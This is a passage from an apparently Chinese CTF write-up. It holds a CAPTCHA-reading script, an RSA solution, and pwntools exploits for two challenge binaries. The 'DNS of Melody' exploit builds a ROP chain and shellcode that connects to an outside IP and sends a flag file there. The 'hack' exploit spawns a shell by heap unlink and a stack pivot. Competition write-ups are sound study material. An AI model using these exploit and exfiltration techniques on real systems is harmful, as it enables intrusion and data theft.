    line['e'][6]='888ooo888         '
    line['f'][3]=' 888 `"           '
    line['g'][4]=' .oooooooo        '
    line['h'][5]=' 888P"Y88b        '
    line['i'][3]=' `"\'              '
    line['j'][10]='.o. 88P           '
    line['k'][4]=' 888  oooo        '
    line['l'][3]='`888              '
    line['l'][4]=' 888              '
    line['l'][5]=' 888              '
    line['l'][6]=' 888              '
    line['m'][8]='o888o o888o o888o '
    line['n'][5]='`888P"Y88b        '
    line['o'][6]='888   888         '
    line['o'][7]='888   888         '
    line['o'][9]='                  '
    line['p'][8]=' 888bod8P\'        '
    line['q'][4]=' .ooooo oo        '
    line['r'][4]='oooo d8b          '
    line['s'][5]='d88(  "8          '
    line['t'][4]='.o888oo           '
    line['u'][4]='oooo  oooo        '
    line['v'][5]=' `88.  .8\'        '
    line['v'][9]='                  '
    line['w'][6]='  `88..]88..8\'    '
    line['x'][4]='oooo    ooo       '
    line['x'][9]='                  '
    line['y'][10]='`Y8P\'             '
    line['y'][9]='.o..P\'            '
    line['z'][5]=' d\'\"\"7d8P         '
    line['0'][3]=' d8P\'`Y8b         '
    line['1'][2]='   .o             '
    line['2'][4]='      ]8P\'        '
    line['2'][8]='8888888888        '
    line['3'][4]='      ]8P\'        '
    line['4'][4]='  .d\'888          '
    line['5'][3]=' dP"""""""        '
    line['6'][8]=' `88bod8\'         '
    line['7'][3]='d"""""""8\'        '
    line['8'][6]='.8\'  ``88b        '
    line['9'][3]='888\' `Y88.        '
    def retchar(i):
        if line7[i:i+18]==line['a'][7]:
            return 'a'
        if line4[i:i+18]==line['b'][4]:
            return 'b'
        if line8[i:i+18]==line['c'][8] and line6[i:i+18]==line['c'][6]:
            return 'c'
        if line4[i:i+18]==line['d'][4]:
            return 'd'
        if line6[i:i+18]==line['e'][6]:
            return 'e'
        if line3[i:i+18]==line['f'][3]:
            return 'f'
        if line4[i:i+18]==line['g'][4]:
            return 'g'
        if line5[i:i+18]==line['h'][5]:
            return 'h'
        if line3[i:i+18]==line['i'][3]:
            return 'i'
        if line10[i:i+18]==line['j'][10]:
            return 'j'
        if line4[i:i+18]==line['k'][4]:
            return 'k'
        if line3[i:i+18]==line['l'][3] and line4[i:i+18]==line['l'][4] and line5[i:i+18]==line['l'][5] :
            return 'l'
        if line8[i:i+18]==line['m'][8]:
            return 'm'
        if line5[i:i+18]==line['n'][5]:
            return 'n'
        if line6[i:i+18]==line['o'][6] and line9[i:i+18]==line['o'][9] and line7[i:i+18]==line['o'][7]:
            return 'o'
        if line8[i:i+18]==line['p'][8]:
            return 'p'
        if line4[i:i+18]==line['q'][4]:
            return 'q'
        if line4[i:i+18]==line['r'][4]:
            return 'r'
        if line5[i:i+18]==line['s'][5]:
            return 's'
        if line4[i:i+18]==line['t'][4]:
            return 't'
        if line4[i:i+18]==line['u'][4]:
            return 'u'
        if line5[i:i+18]==line['v'][5] and line9[i:i+18]==line['v'][9]:
            return 'v'
        if line6[i:i+18]==line['w'][6]:
            return 'w'
        if line4[i:i+18]==line['x'][4] and line9[i:i+18]==line['x'][9]:
            return 'x'
        if line10[i:i+18]==line['y'][10] and line9[i:i+18]==line['y'][9]:
            return 'y'
        if line5[i:i+18]==line['z'][5]:
            return 'z'
        if line3[i:i+18]==line['0'][3]:
            return '0'
        if line2[i:i+18]==line['1'][2]:
            return '1'
        if line4[i:i+18]==line['2'][4] and line8[i:i+18]==line['2'][8]:
            return '2'
        if line4[i:i+18]==line['3'][4]:
            return '3'
        if line4[i:i+18]==line['4'][4]:
            return '4'
        if line3[i:i+18]==line['5'][3]:
            return '5'
        if line8[i:i+18]==line['6'][8]:
            return '6'
        if line3[i:i+18]==line['7'][3]:
            return '7'
        if line6[i:i+18]==line['8'][6]:
            return '8'
        if line3[i:i+18]==line['9'][3]:
            return '9'
        return '+'
    p.recvuntil('A 20 rounds unCAPTCHA to get your flag! you may need a wider screen...\n')
    for time in range(20):
        if time == 0:
            line1 = p.recvline()
        line2 = p.recvline()
        line3 = p.recvline()
        line4 = p.recvline()
        line5 = p.recvline()
        line6 = p.recvline()
        line7 = p.recvline()
        line8 = p.recvline()
        line9 = p.recvline()
        line10 = p.recvline()
        line11 = p.recvuntil('your captcha:')
        payload=''
        for i in range(0,6*18,18):
            payload+=retchar(i)
        print "payload : "+payload
        p.sendline(payload)
    print p.recv(1024)
    p.interactive()
### Youchat
爆破时间戳
服务器时间戳 = 1537004467
算出key用recv函数把msg解掉就行
## Crypto
### AzureRSA
$p=\gcd(n_1,n_2)$ 可以直接求出来
    from data import *
    import gmpy2
    def main():
        f14 = crt([n1, n2], [pow(c1, d1, n1), pow(c2, d2, n2)])
        d14 = modinv(14, (q1 - 1) * (q2 - 1))
        f2 = pow(f14, d14, q1 * q2)
        f = int(gmpy2.isqrt(f2))
        print(f.to_bytes(64, 'big'))
    if __name__ == '__main__':
        main()
可以解 $c_1^{d_1}\equiv m^{14}\pmod{n_1}\c_2^{d_2}\equiv m^{14}\pmod{n_2}$
可用剩余定理求得 $m^{14}\pmod{\operatorname{lcm}(n_1,n_2)}$
设 $e=14$, 可以解得 $\displaystyle d\equiv\left(\frac
{14}2\right)^{-1}\pmod{q_1q_2}$, 则 $\left(m^e\right)^d\equiv
m^2\pmod{p_1p_2}$, 直接开根号.
## pwn
### hack
分别leak出libc的地址，随后从envp leak出栈的地址
用unlink攻击栈，让栈迁移到堆上执行one_gadget
    from pwn import *
    context.log_level = 'debug'
    context.aslr = True
    def pwn(p):
        p.recvuntil('address:')
        p.sendline(str(0x804A010))
        p.recvuntil('0x')
        libc_base = int(p.recvuntil('\n', drop=True), 16) - 0x49020
        log.success('libc:{}'.format(hex(libc_base)))
        p.recvuntil('Second chance: ')
        p.sendline(str(libc_base + 0x001B1DBC))
        p.recvuntil('0x')
        stack_ptr = int(p.recvuntil('\n', drop=True), 16)
        old_esp_addr = stack_ptr - 0xb8
        log.success('stack_ptr:{}'.format(hex(stack_ptr)))
        log.success('old_esp_addr:{}'.format(hex(old_esp_addr)))
        p.recvuntil('of the node is 0x')
        heap_base = int(p.recvuntil(',', drop=True), 16) - 0x20
        log.success('heap_base:{}'.format(hex(heap_base)))
        p.recvuntil('node now: ')
        payload = p32(0x3A940 + libc_base) + 'sh\x00\x00' + p32(heap_base + 0x20 + 4) + p32(old_esp_addr - 0x8)
        payload = p32(0x3a80e + libc_base) + 'sh\x00\x00' + p32(heap_base + 0x20 + 4) + p32(old_esp_addr - 0x8)
        payload = p32(0x3a819 + libc_base) + 'sh\x00\x00' + p32(heap_base + 0x20 + 4) + p32(old_esp_addr - 0x8)
        #gdb.attach(p)
        p.send(payload)
        p.interactive()
    if __name__ == '__main__':
        p = process('./hack')
        p = remote('210.32.4.16', 13375)
        pwn(p)
### DNS of Melody
在edit取size时 size是按int取的，当解析dns失败时会导致无限长度的栈溢出
调用memcpy在bss段copy出alarm的地址，修改低位得到syscall，调用mprotect令bss段可执行
写shellcode让程序读取flag并反弹出外界
    from pwn import *
    context.log_level = 'debug'
    context.arch = 'amd64'
    def add_query(p, l, payload):
        p.recvuntil('Select:\n')
        p.sendline('1')
        p.recvuntil('give me length: \n')
        p.sendline(str(l))
        p.send(payload)
    def query(p, idx):
        p.recvuntil('Select:\n')
        p.sendline('2')
        p.recvuntil('give me index: \n')
        p.sendline(str(idx))
    def edit_query(p, idx, payload):
        p.recvuntil('Select:\n')
        p.sendline('4')
        p.recvuntil('give me index: \n')
        p.sendline(str(idx))
        p.send(payload)
    def pwn(p):
        bss_addr = 0x602300
        #gdb.attach(p)
        payload = 'test\n'
        add_query(p, 0x100, payload)
        query(p, 0)
        payload = '\x0510\x00aaaa'
        payload += asm(shellcraft.amd64.linux.connect('39.108.116.36', 12345))
        payload += asm(shellcraft.amd64.linux.readfile('flag', 0))
        payload = payload.ljust(0x190, 'a')
        payload += p64(0) + p64(0)*2
        payload += flat([0x4012AA, 0, 1, 0x601FE0, 8, 0x601FA8, bss_addr, 0x401290]) # memcpy
        payload += flat([0, 0, 1, 0x601FE0, 1, 0x602060, bss_addr, 0x401290]) # memcpy
        payload += flat([0, 0, 1, 0x601FF0, 0,  0, 0x602061, 0x401290]) # atoi
        payload += flat([0, 0, 1, bss_addr, 7,  0x1000, 0x602000, 0x401290]) # mprotect
        payload += flat([0, 0, 0, 0, 0,  0, 0, 0x602068])
        edit_query(p, 0, payload + '\n')
        p.interactive()
    if __name__ == '__main__':
        #p = process('./dns_of_melody')
        p = remote('210.32.4.15', 13374)
        pwn(p)